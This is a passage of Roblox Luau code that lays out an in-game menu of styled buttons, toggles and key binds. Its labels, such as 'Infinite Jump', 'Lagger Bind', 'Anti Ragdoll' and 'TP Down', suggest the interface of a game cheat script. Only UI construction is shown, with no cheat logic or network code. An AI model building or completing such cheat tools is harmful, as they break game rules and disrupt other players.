G.TextLabel_9.Text = "Jump Mode"
G.TextLabel_9.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_9.TextSize = 11
G.TextLabel_9.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_9.Parent = G.Frame_16

G.TextButton_4 = Instance.new("TextButton")
G.TextButton_4.BackgroundColor3 = Color3.fromRGB(20, 72, 160)
G.TextButton_4.BorderSizePixel = 0
G.TextButton_4.Position = UDim2.new(1, -88, 0.5, -13)
G.TextButton_4.Size = UDim2.new(0, 80, 0, 26)
G.TextButton_4.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextButton_4.Text = "Tap"
G.TextButton_4.TextColor3 = Color3.fromRGB(240, 245, 255)
G.TextButton_4.TextSize = 11
G.TextButton_4.Parent = G.Frame_16

G.UICorner_19 = Instance.new("UICorner")
G.UICorner_19.CornerRadius = UDim.new(0, 4)
G.UICorner_19.Parent = G.TextButton_4

G.UIStroke_12 = Instance.new("UIStroke")
G.UIStroke_12.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_12.Color = Color3.fromRGB(18, 38, 75)
G.UIStroke_12.Parent = G.TextButton_4

G.Frame_17 = Instance.new("Frame")
G.Frame_17.BackgroundTransparency = 1
G.Frame_17.BorderSizePixel = 0
G.Frame_17.LayoutOrder = 13
G.Frame_17.Size = UDim2.new(1, 0, 0, 2)
G.Frame_17.Parent = G.WavePage_Speed

G.Frame_18 = Instance.new("Frame")
G.Frame_18.BackgroundTransparency = 1
G.Frame_18.BorderSizePixel = 0
G.Frame_18.LayoutOrder = 4
G.Frame_18.Size = UDim2.new(1, 0, 0, 34)
G.Frame_18.Parent = G.WavePage_Speed

G.TextLabel_10 = Instance.new("TextLabel")
G.TextLabel_10.BackgroundTransparency = 1
G.TextLabel_10.Position = UDim2.new(0, 14, 0, 0)
G.TextLabel_10.Size = UDim2.new(1, -64, 1, 0)
G.TextLabel_10.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_10.Text = "Speed Bind"
G.TextLabel_10.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_10.TextSize = 11
G.TextLabel_10.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_10.Parent = G.Frame_18

G.TextButton_5 = Instance.new("TextButton")
G.TextButton_5.BackgroundColor3 = Color3.fromRGB(6, 14, 38)
G.TextButton_5.BorderSizePixel = 0
G.TextButton_5.Position = UDim2.new(1, -54, 0.5, -12)
G.TextButton_5.Size = UDim2.new(0, 44, 0, 24)
G.TextButton_5.ZIndex = 8
G.TextButton_5.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextButton_5.Text = "Q"
G.TextButton_5.TextColor3 = Color3.fromRGB(70, 115, 180)
G.TextButton_5.TextSize = 10
G.TextButton_5.Parent = G.Frame_18

G.UICorner_20 = Instance.new("UICorner")
G.UICorner_20.CornerRadius = UDim.new(0, 6)
G.UICorner_20.Parent = G.TextButton_5

G.UIStroke_13 = Instance.new("UIStroke")
G.UIStroke_13.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_13.Color = Color3.fromRGB(18, 40, 85)
G.UIStroke_13.Parent = G.TextButton_5

G.Frame_19 = Instance.new("Frame")
G.Frame_19.BackgroundTransparency = 1
G.Frame_19.BorderSizePixel = 0
G.Frame_19.LayoutOrder = 8
G.Frame_19.Size = UDim2.new(1, 0, 0, 34)
G.Frame_19.Parent = G.WavePage_Speed

G.TextLabel_11 = Instance.new("TextLabel")
G.TextLabel_11.BackgroundTransparency = 1
G.TextLabel_11.Position = UDim2.new(0, 14, 0, 0)
G.TextLabel_11.Size = UDim2.new(1, -64, 1, 0)
G.TextLabel_11.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_11.Text = "Lagger Bind"
G.TextLabel_11.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_11.TextSize = 11
G.TextLabel_11.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_11.Parent = G.Frame_19

G.TextButton_6 = Instance.new("TextButton")
G.TextButton_6.BackgroundColor3 = Color3.fromRGB(6, 14, 38)
G.TextButton_6.BorderSizePixel = 0
G.TextButton_6.Position = UDim2.new(1, -54, 0.5, -12)
G.TextButton_6.Size = UDim2.new(0, 44, 0, 24)
G.TextButton_6.ZIndex = 8
G.TextButton_6.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextButton_6.Text = "R"
G.TextButton_6.TextColor3 = Color3.fromRGB(70, 115, 180)
G.TextButton_6.TextSize = 10
G.TextButton_6.Parent = G.Frame_19

G.UICorner_21 = Instance.new("UICorner")
G.UICorner_21.CornerRadius = UDim.new(0, 6)
G.UICorner_21.Parent = G.TextButton_6

G.UIStroke_14 = Instance.new("UIStroke")
G.UIStroke_14.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_14.Color = Color3.fromRGB(18, 40, 85)
G.UIStroke_14.Parent = G.TextButton_6

G.Frame_20 = Instance.new("Frame")
G.Frame_20.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_20.BackgroundTransparency = 1
G.Frame_20.BorderSizePixel = 0
G.Frame_20.LayoutOrder = 25
G.Frame_20.Size = UDim2.new(1, 0, 0, 40)
G.Frame_20.Parent = G.WavePage_Speed

G.TextLabel_12 = Instance.new("TextLabel")
G.TextLabel_12.BackgroundTransparency = 1
G.TextLabel_12.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_12.Size = UDim2.new(1, -120, 1, 0)
G.TextLabel_12.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_12.Text = "Infinite Jump"
G.TextLabel_12.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_12.TextSize = 11
G.TextLabel_12.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_12.Parent = G.Frame_20

G.WaveTogglePill = Instance.new("Frame")
G.WaveTogglePill.Name = "WaveTogglePill"
G.WaveTogglePill.BackgroundColor3 = Color3.fromRGB(12, 22, 55)
G.WaveTogglePill.BorderSizePixel = 0
G.WaveTogglePill.Position = UDim2.new(1, -54, 0.5, -9)
G.WaveTogglePill.Size = UDim2.new(0, 40, 0, 18)
G.WaveTogglePill.ZIndex = 7
G.WaveTogglePill:SetAttribute("WaveToggleOn", false)
G.WaveTogglePill.Parent = G.Frame_20

G.UICorner_22 = Instance.new("UICorner")
G.UICorner_22.CornerRadius = UDim.new(0, 9)
G.UICorner_22.Parent = G.WaveTogglePill

G.UIStroke_15 = Instance.new("UIStroke")
G.UIStroke_15.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_15.Color = Color3.fromRGB(22, 52, 100)
G.UIStroke_15.Parent = G.WaveTogglePill

G.WaveToggleDot = Instance.new("Frame")
G.WaveToggleDot.Name = "WaveToggleDot"
G.WaveToggleDot.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
G.WaveToggleDot.BorderSizePixel = 0
G.WaveToggleDot.Position = UDim2.new(0, 3, 0.5, -6)
G.WaveToggleDot.Size = UDim2.new(0, 12, 0, 12)
G.WaveToggleDot.ZIndex = 8
G.WaveToggleDot.Parent = G.WaveTogglePill

G.UICorner_23 = Instance.new("UICorner")
G.UICorner_23.CornerRadius = UDim.new(0, 6)
G.UICorner_23.Parent = G.WaveToggleDot

G.TextButton_7 = Instance.new("TextButton")
G.TextButton_7.BackgroundTransparency = 1
G.TextButton_7.BorderSizePixel = 0
G.TextButton_7.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_7.ZIndex = 9
G.TextButton_7.Text = ""
G.TextButton_7.Parent = G.WaveTogglePill

G.SizeDropdown = Instance.new("TextButton")
G.SizeDropdown.Name = "SizeDropdown"
G.SizeDropdown.BackgroundColor3 = Color3.fromRGB(6, 14, 38)
G.SizeDropdown.BorderSizePixel = 0
G.SizeDropdown.Position = UDim2.new(1, -106, 0.5, -11)
G.SizeDropdown.Size = UDim2.new(0, 34, 0, 22)
G.SizeDropdown.ZIndex = 9
G.SizeDropdown.Text = ""
G.SizeDropdown.Parent = G.Frame_20

G.UICorner_24 = Instance.new("UICorner")
G.UICorner_24.CornerRadius = UDim.new(0, 4)
G.UICorner_24.Parent = G.SizeDropdown

G.UIStroke_16 = Instance.new("UIStroke")
G.UIStroke_16.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_16.Color = Color3.fromRGB(18, 40, 85)
G.UIStroke_16.Parent = G.SizeDropdown

G.Arrow = Instance.new("TextLabel")
G.Arrow.Name = "Arrow"
G.Arrow.BackgroundTransparency = 1
G.Arrow.Size = UDim2.new(1, 0, 1, 0)
G.Arrow.ZIndex = 10
G.Arrow.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.Arrow.Text = "▼"
G.Arrow.TextColor3 = Color3.fromRGB(70, 115, 180)
G.Arrow.TextSize = 16
G.Arrow.Parent = G.SizeDropdown

G.Frame_21 = Instance.new("Frame")
G.Frame_21.BackgroundTransparency = 1
G.Frame_21.BorderSizePixel = 0
G.Frame_21.LayoutOrder = 17
G.Frame_21.Size = UDim2.new(1, 0, 0, 28)
G.Frame_21.Parent = G.WavePage_Speed

G.TextLabel_13 = Instance.new("TextLabel")
G.TextLabel_13.BackgroundTransparency = 1
G.TextLabel_13.Position = UDim2.new(0, 8, 0, 0)
G.TextLabel_13.Size = UDim2.new(1, -14, 1, 0)
G.TextLabel_13.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_13.Text = "MOVEMENT"
G.TextLabel_13.TextColor3 = Color3.fromRGB(45, 130, 230)
G.TextLabel_13.TextSize = 13
G.TextLabel_13.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_13.Parent = G.Frame_21

G.Frame_22 = Instance.new("Frame")
G.Frame_22.BackgroundTransparency = 1
G.Frame_22.BorderSizePixel = 0
G.Frame_22.LayoutOrder = 18
G.Frame_22.Size = UDim2.new(1, 0, 0, 2)
G.Frame_22.Parent = G.WavePage_Speed

G.Frame_23 = Instance.new("Frame")
G.Frame_23.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_23.BackgroundTransparency = 1
G.Frame_23.BorderSizePixel = 0
G.Frame_23.LayoutOrder = 19
G.Frame_23.Size = UDim2.new(1, 0, 0, 40)
G.Frame_23.Parent = G.WavePage_Speed

G.TextLabel_14 = Instance.new("TextLabel")
G.TextLabel_14.BackgroundTransparency = 1
G.TextLabel_14.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_14.Size = UDim2.new(1, -148, 1, 0)
G.TextLabel_14.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_14.Text = "Auto Carry Speed"
G.TextLabel_14.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_14.TextSize = 11
G.TextLabel_14.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_14.Parent = G.Frame_23

G.WaveTogglePill_2 = Instance.new("Frame")
G.WaveTogglePill_2.Name = "WaveTogglePill"
G.WaveTogglePill_2.BackgroundColor3 = Color3.fromRGB(12, 22, 55)
G.WaveTogglePill_2.BorderSizePixel = 0
G.WaveTogglePill_2.Position = UDim2.new(1, -54, 0.5, -9)
G.WaveTogglePill_2.Size = UDim2.new(0, 40, 0, 18)
G.WaveTogglePill_2.ZIndex = 7
G.WaveTogglePill_2:SetAttribute("WaveToggleOn", false)
G.WaveTogglePill_2.Parent = G.Frame_23

G.UICorner_25 = Instance.new("UICorner")
G.UICorner_25.CornerRadius = UDim.new(0, 9)
G.UICorner_25.Parent = G.WaveTogglePill_2

G.UIStroke_17 = Instance.new("UIStroke")
G.UIStroke_17.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_17.Color = Color3.fromRGB(22, 52, 100)
G.UIStroke_17.Parent = G.WaveTogglePill_2

G.WaveToggleDot_2 = Instance.new("Frame")
G.WaveToggleDot_2.Name = "WaveToggleDot"
G.WaveToggleDot_2.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
G.WaveToggleDot_2.BorderSizePixel = 0
G.WaveToggleDot_2.Position = UDim2.new(0, 3, 0.5, -6)
G.WaveToggleDot_2.Size = UDim2.new(0, 12, 0, 12)
G.WaveToggleDot_2.ZIndex = 8
G.WaveToggleDot_2.Parent = G.WaveTogglePill_2

G.UICorner_26 = Instance.new("UICorner")
G.UICorner_26.CornerRadius = UDim.new(0, 6)
G.UICorner_26.Parent = G.WaveToggleDot_2

G.TextButton_8 = Instance.new("TextButton")
G.TextButton_8.BackgroundTransparency = 1
G.TextButton_8.BorderSizePixel = 0
G.TextButton_8.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_8.ZIndex = 9
G.TextButton_8.Text = ""
G.TextButton_8.Parent = G.WaveTogglePill_2

G.TextButton_9 = Instance.new("TextButton")
G.TextButton_9.BackgroundColor3 = Color3.fromRGB(20, 72, 160)
G.TextButton_9.BorderSizePixel = 0
G.TextButton_9.Position = UDim2.new(1, -128, 0.5, -12)
G.TextButton_9.Size = UDim2.new(0, 58, 0, 24)
G.TextButton_9.ZIndex = 8
G.TextButton_9.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextButton_9.Text = "V1"
G.TextButton_9.TextColor3 = Color3.fromRGB(240, 245, 255)
G.TextButton_9.TextSize = 10
G.TextButton_9.Parent = G.Frame_23

G.UICorner_27 = Instance.new("UICorner")
G.UICorner_27.CornerRadius = UDim.new(0, 4)
G.UICorner_27.Parent = G.TextButton_9

G.UIStroke_18 = Instance.new("UIStroke")
G.UIStroke_18.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_18.Color = Color3.fromRGB(18, 38, 75)
G.UIStroke_18.Parent = G.TextButton_9

G.Frame_24 = Instance.new("Frame")
G.Frame_24.BackgroundTransparency = 1
G.Frame_24.BorderSizePixel = 0
G.Frame_24.LayoutOrder = 20
G.Frame_24.Size = UDim2.new(1, 0, 0, 34)
G.Frame_24.Parent = G.WavePage_Speed

G.TextLabel_15 = Instance.new("TextLabel")
G.TextLabel_15.BackgroundTransparency = 1
G.TextLabel_15.Position = UDim2.new(0, 14, 0, 0)
G.TextLabel_15.Size = UDim2.new(1, -64, 1, 0)
G.TextLabel_15.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_15.Text = "Auto Left"
G.TextLabel_15.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_15.TextSize = 11
G.TextLabel_15.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_15.Parent = G.Frame_24

G.TextButton_10 = Instance.new("TextButton")
G.TextButton_10.BackgroundColor3 = Color3.fromRGB(6, 14, 38)
G.TextButton_10.BorderSizePixel = 0
G.TextButton_10.Position = UDim2.new(1, -54, 0.5, -12)
G.TextButton_10.Size = UDim2.new(0, 44, 0, 24)
G.TextButton_10.ZIndex = 8
G.TextButton_10.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextButton_10.Text = "Z"
G.TextButton_10.TextColor3 = Color3.fromRGB(70, 115, 180)
G.TextButton_10.TextSize = 10
G.TextButton_10.Parent = G.Frame_24

G.UICorner_28 = Instance.new("UICorner")
G.UICorner_28.CornerRadius = UDim.new(0, 6)
G.UICorner_28.Parent = G.TextButton_10

G.UIStroke_19 = Instance.new("UIStroke")
G.UIStroke_19.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_19.Color = Color3.fromRGB(18, 40, 85)
G.UIStroke_19.Parent = G.TextButton_10

G.Frame_25 = Instance.new("Frame")
G.Frame_25.BackgroundTransparency = 1
G.Frame_25.BorderSizePixel = 0
G.Frame_25.LayoutOrder = 21
G.Frame_25.Size = UDim2.new(1, 0, 0, 34)
G.Frame_25.Parent = G.WavePage_Speed

G.TextLabel_16 = Instance.new("TextLabel")
G.TextLabel_16.BackgroundTransparency = 1
G.TextLabel_16.Position = UDim2.new(0, 14, 0, 0)
G.TextLabel_16.Size = UDim2.new(1, -64, 1, 0)
G.TextLabel_16.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_16.Text = "Auto Right"
G.TextLabel_16.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_16.TextSize = 11
G.TextLabel_16.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_16.Parent = G.Frame_25

G.TextButton_11 = Instance.new("TextButton")
G.TextButton_11.BackgroundColor3 = Color3.fromRGB(6, 14, 38)
G.TextButton_11.BorderSizePixel = 0
G.TextButton_11.Position = UDim2.new(1, -54, 0.5, -12)
G.TextButton_11.Size = UDim2.new(0, 44, 0, 24)
G.TextButton_11.ZIndex = 8
G.TextButton_11.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextButton_11.Text = "C"
G.TextButton_11.TextColor3 = Color3.fromRGB(70, 115, 180)
G.TextButton_11.TextSize = 10
G.TextButton_11.Parent = G.Frame_25

G.UICorner_29 = Instance.new("UICorner")
G.UICorner_29.CornerRadius = UDim.new(0, 6)
G.UICorner_29.Parent = G.TextButton_11

G.UIStroke_20 = Instance.new("UIStroke")
G.UIStroke_20.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_20.Color = Color3.fromRGB(18, 40, 85)
G.UIStroke_20.Parent = G.TextButton_11

G.Frame_26 = Instance.new("Frame")
G.Frame_26.BackgroundTransparency = 1
G.Frame_26.BorderSizePixel = 0
G.Frame_26.LayoutOrder = 22
G.Frame_26.Size = UDim2.new(1, 0, 0, 2)
G.Frame_26.Parent = G.WavePage_Speed

G.Frame_27 = Instance.new("Frame")
G.Frame_27.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_27.BackgroundTransparency = 1
G.Frame_27.BorderSizePixel = 0
G.Frame_27.LayoutOrder = 28
G.Frame_27.Size = UDim2.new(1, 0, 0, 40)
G.Frame_27.Parent = G.WavePage_Speed

G.TextLabel_17 = Instance.new("TextLabel")
G.TextLabel_17.BackgroundTransparency = 1
G.TextLabel_17.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_17.Size = UDim2.new(1, -148, 1, 0)
G.TextLabel_17.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_17.Text = "Anti Ragdoll"
G.TextLabel_17.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_17.TextSize = 11
G.TextLabel_17.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_17.Parent = G.Frame_27

G.WaveTogglePill_3 = Instance.new("Frame")
G.WaveTogglePill_3.Name = "WaveTogglePill"
G.WaveTogglePill_3.BackgroundColor3 = Color3.fromRGB(12, 22, 55)
G.WaveTogglePill_3.BorderSizePixel = 0
G.WaveTogglePill_3.Position = UDim2.new(1, -54, 0.5, -9)
G.WaveTogglePill_3.Size = UDim2.new(0, 40, 0, 18)
G.WaveTogglePill_3.ZIndex = 7
G.WaveTogglePill_3:SetAttribute("WaveToggleOn", false)
G.WaveTogglePill_3.Parent = G.Frame_27

G.UICorner_30 = Instance.new("UICorner")
G.UICorner_30.CornerRadius = UDim.new(0, 9)
G.UICorner_30.Parent = G.WaveTogglePill_3

G.UIStroke_21 = Instance.new("UIStroke")
G.UIStroke_21.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_21.Color = Color3.fromRGB(22, 52, 100)
G.UIStroke_21.Parent = G.WaveTogglePill_3

G.WaveToggleDot_3 = Instance.new("Frame")
G.WaveToggleDot_3.Name = "WaveToggleDot"
G.WaveToggleDot_3.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
G.WaveToggleDot_3.BorderSizePixel = 0
G.WaveToggleDot_3.Position = UDim2.new(0, 3, 0.5, -6)
G.WaveToggleDot_3.Size = UDim2.new(0, 12, 0, 12)
G.WaveToggleDot_3.ZIndex = 8
G.WaveToggleDot_3.Parent = G.WaveTogglePill_3

G.UICorner_31 = Instance.new("UICorner")
G.UICorner_31.CornerRadius = UDim.new(0, 6)
G.UICorner_31.Parent = G.WaveToggleDot_3

G.TextButton_12 = Instance.new("TextButton")
G.TextButton_12.BackgroundTransparency = 1
G.TextButton_12.BorderSizePixel = 0
G.TextButton_12.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_12.ZIndex = 9
G.TextButton_12.Text = ""
G.TextButton_12.Parent = G.WaveTogglePill_3

G.TextButton_13 = Instance.new("TextButton")
G.TextButton_13.BackgroundColor3 = Color3.fromRGB(20, 72, 160)
G.TextButton_13.BorderSizePixel = 0
G.TextButton_13.Position = UDim2.new(1, -128, 0.5, -12)
G.TextButton_13.Size = UDim2.new(0, 58, 0, 24)
G.TextButton_13.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextButton_13.Text = "V1"
G.TextButton_13.TextColor3 = Color3.fromRGB(240, 245, 255)
G.TextButton_13.TextSize = 10
G.TextButton_13.Parent = G.Frame_27

G.UICorner_32 = Instance.new("UICorner")
G.UICorner_32.CornerRadius = UDim.new(0, 4)
G.UICorner_32.Parent = G.TextButton_13

G.UIStroke_22 = Instance.new("UIStroke")
G.UIStroke_22.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_22.Color = Color3.fromRGB(18, 38, 75)
G.UIStroke_22.Parent = G.TextButton_13

G.Frame_28 = Instance.new("Frame")
G.Frame_28.BackgroundTransparency = 1
G.Frame_28.BorderSizePixel = 0
G.Frame_28.LayoutOrder = 24
G.Frame_28.Size = UDim2.new(1, 0, 0, 34)
G.Frame_28.Parent = G.WavePage_Speed

G.TextLabel_18 = Instance.new("TextLabel")
G.TextLabel_18.BackgroundTransparency = 1
G.TextLabel_18.Position = UDim2.new(0, 14, 0, 0)
G.TextLabel_18.Size = UDim2.new(1, -148, 1, 0)
G.TextLabel_18.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_18.Text = "Drop BR"
G.TextLabel_18.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_18.TextSize = 11
G.TextLabel_18.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_18.Parent = G.Frame_28

G.TextButton_14 = Instance.new("TextButton")
G.TextButton_14.BackgroundColor3 = Color3.fromRGB(20, 72, 160)
G.TextButton_14.BorderSizePixel = 0
G.TextButton_14.Position = UDim2.new(1, -130, 0.5, -12)
G.TextButton_14.Size = UDim2.new(0, 58, 0, 24)
G.TextButton_14.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextButton_14.Text = "Jump"
G.TextButton_14.TextColor3 = Color3.fromRGB(240, 245, 255)
G.TextButton_14.TextSize = 10
G.TextButton_14.Parent = G.Frame_28

G.UICorner_33 = Instance.new("UICorner")
G.UICorner_33.CornerRadius = UDim.new(0, 4)
G.UICorner_33.Parent = G.TextButton_14

G.UIStroke_23 = Instance.new("UIStroke")
G.UIStroke_23.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_23.Color = Color3.fromRGB(18, 38, 75)
G.UIStroke_23.Parent = G.TextButton_14

G.TextButton_15 = Instance.new("TextButton")
G.TextButton_15.BackgroundColor3 = Color3.fromRGB(6, 14, 38)
G.TextButton_15.BorderSizePixel = 0
G.TextButton_15.Position = UDim2.new(1, -54, 0.5, -12)
G.TextButton_15.Size = UDim2.new(0, 44, 0, 24)
G.TextButton_15.ZIndex = 8
G.TextButton_15.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextButton_15.Text = "X"
G.TextButton_15.TextColor3 = Color3.fromRGB(70, 115, 180)
G.TextButton_15.TextSize = 10
G.TextButton_15.Parent = G.Frame_28

G.UICorner_34 = Instance.new("UICorner")
G.UICorner_34.CornerRadius = UDim.new(0, 6)
G.UICorner_34.Parent = G.TextButton_15

G.UIStroke_24 = Instance.new("UIStroke")
G.UIStroke_24.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_24.Color = Color3.fromRGB(18, 40, 85)
G.UIStroke_24.Parent = G.TextButton_15

G.Frame_29 = Instance.new("Frame")
G.Frame_29.BackgroundTransparency = 1
G.Frame_29.BorderSizePixel = 0
G.Frame_29.LayoutOrder = 25
G.Frame_29.Size = UDim2.new(1, 0, 0, 2)
G.Frame_29.Parent = G.WavePage_Speed

G.Frame_30 = Instance.new("Frame")
G.Frame_30.BackgroundTransparency = 1
G.Frame_30.BorderSizePixel = 0
G.Frame_30.LayoutOrder = 26
G.Frame_30.Size = UDim2.new(1, 0, 0, 2)
G.Frame_30.Parent = G.WavePage_Speed

G.Frame_31 = Instance.new("Frame")
G.Frame_31.BackgroundTransparency = 1
G.Frame_31.BorderSizePixel = 0
G.Frame_31.ClipsDescendants = true
G.Frame_31.LayoutOrder = 27
G.Frame_31.Size = UDim2.new(1, 0, 0, 38)
G.Frame_31.Visible = false
G.Frame_31.Parent = G.WavePage_Speed

G.TextLabel_19 = Instance.new("TextLabel")
G.TextLabel_19.BackgroundTransparency = 1
G.TextLabel_19.Position = UDim2.new(0, 14, 0, 0)
G.TextLabel_19.Size = UDim2.new(1, -78, 1, 0)
G.TextLabel_19.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_19.Text = "Jump Power"
G.TextLabel_19.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_19.TextSize = 11
G.TextLabel_19.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_19.Parent = G.Frame_31

G.Frame_32 = Instance.new("Frame")
G.Frame_32.BackgroundColor3 = Color3.fromRGB(6, 14, 38)
G.Frame_32.BorderSizePixel = 0
G.Frame_32.Position = UDim2.new(1, -64, 0.5, -13)
G.Frame_32.Size = UDim2.new(0, 54, 0, 26)
G.Frame_32.Parent = G.Frame_31

G.UICorner_35 = Instance.new("UICorner")
G.UICorner_35.CornerRadius = UDim.new(0, 6)
G.UICorner_35.Parent = G.Frame_32

G.UIStroke_25 = Instance.new("UIStroke")
G.UIStroke_25.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_25.Color = Color3.fromRGB(18, 40, 85)
G.UIStroke_25.Parent = G.Frame_32

G.TextBox_5 = Instance.new("TextBox")
G.TextBox_5.BackgroundTransparency = 1
G.TextBox_5.Position = UDim2.new(0, 3, 0, 0)
G.TextBox_5.Size = UDim2.new(1, -6, 1, 0)
G.TextBox_5.ZIndex = 8
G.TextBox_5.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextBox_5.Text = "55"
G.TextBox_5.TextColor3 = Color3.fromRGB(70, 115, 180)
G.TextBox_5.TextSize = 11
G.TextBox_5.ClearTextOnFocus = false
G.TextBox_5.Parent = G.Frame_32

G.Frame_33 = Instance.new("Frame")
G.Frame_33.BackgroundTransparency = 1
G.Frame_33.BorderSizePixel = 0
G.Frame_33.LayoutOrder = 75
G.Frame_33.Size = UDim2.new(1, 0, 0, 2)
G.Frame_33.Parent = G.WavePage_Speed

G.Frame_34 = Instance.new("Frame")
G.Frame_34.BackgroundTransparency = 1
G.Frame_34.BorderSizePixel = 0
G.Frame_34.LayoutOrder = 1008
G.Frame_34.Size = UDim2.new(1, 0, 0, 28)
G.Frame_34.Parent = G.WavePage_Speed

G.TextLabel_20 = Instance.new("TextLabel")
G.TextLabel_20.BackgroundTransparency = 1
G.TextLabel_20.Position = UDim2.new(0, 8, 0, 0)
G.TextLabel_20.Size = UDim2.new(1, -14, 1, 0)
G.TextLabel_20.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_20.Text = "TELEPORT"
G.TextLabel_20.TextColor3 = Color3.fromRGB(45, 130, 230)
G.TextLabel_20.TextSize = 13
G.TextLabel_20.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_20.Parent = G.Frame_34

G.Frame_35 = Instance.new("Frame")
G.Frame_35.BackgroundTransparency = 1
G.Frame_35.BorderSizePixel = 0
G.Frame_35.LayoutOrder = 1009
G.Frame_35.Size = UDim2.new(1, 0, 0, 34)
G.Frame_35.Parent = G.WavePage_Speed

G.TextLabel_21 = Instance.new("TextLabel")
G.TextLabel_21.BackgroundTransparency = 1
G.TextLabel_21.Position = UDim2.new(0, 14, 0, 0)
G.TextLabel_21.Size = UDim2.new(1, -64, 1, 0)
G.TextLabel_21.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_21.Text = "TP Down"
